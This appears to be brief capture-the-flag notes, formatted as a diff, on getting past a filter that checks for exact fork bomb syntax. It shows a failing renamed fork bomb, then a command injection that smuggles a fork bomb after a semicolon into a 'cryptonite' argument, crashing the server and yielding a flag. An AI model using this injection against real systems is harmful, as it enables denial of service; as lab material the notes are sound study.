@@ -1,0 +1,8 @@
+Ok so they check exactly for the fork bomb syntax lol ok
+
+fork(){ fork|fork & };fork does not work
+
+cryptonite -n ;:(){ :|: & };:
+
+Error: server not responding
+Flag: 9AWUEACV6B
